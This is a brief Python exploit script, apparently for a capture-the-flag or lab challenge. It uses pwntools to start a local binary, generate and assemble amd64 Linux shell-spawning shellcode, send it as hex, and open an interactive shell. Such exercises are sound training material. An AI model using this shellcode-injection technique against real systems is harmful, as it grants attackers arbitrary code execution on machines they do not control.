from pwn import *

p = process("./piss1")
p.recvuntil("Type some hex (end with newline):")

context.arch = "amd64"
code = shellcraft.amd64.linux.sh()

print(code)

assembled = asm(code)
print(assembled.hex())
p.sendline(assembled.hex())

p.interactive()
